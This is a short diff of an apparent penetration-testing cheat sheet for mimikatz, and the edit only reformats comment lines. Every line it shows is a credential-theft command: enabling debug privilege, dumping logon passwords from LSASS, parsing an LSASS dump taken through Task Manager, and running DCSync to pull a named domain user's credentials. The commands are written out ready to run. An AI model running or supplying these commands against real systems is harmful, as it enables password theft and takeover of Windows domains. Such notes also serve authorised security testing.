@@ -69,13 +69,13 @@ https://github.com/ParrotSec/mimikatz
 mimikatz # privilege::debug  
 mimikatz # sekurlsa::logonpasswords  
 
-#### use lsass.DMP and put results to lsass.txt  
-#### lsass.DMP can be acquired with right click lsass.exe and create dump method from task manager in details  
+#use lsass.DMP and put results to lsass.txt  
+#lsass.DMP can be acquired with right click lsass.exe and create dump method from task manager in details  
 mimikatz # sekurlsa::minidump lsass.DMP  
 mimikatz # log lsass.txt  
 mimikatz # sekurlsa::logonPasswords  
 
-#### for dcsync abuse  
+#for dcsync abuse  
 mimikatz # lsadump::dcsync  
 mimikatz # lsadump::dcsync /user:<UserName>  #for spesific user only  
 
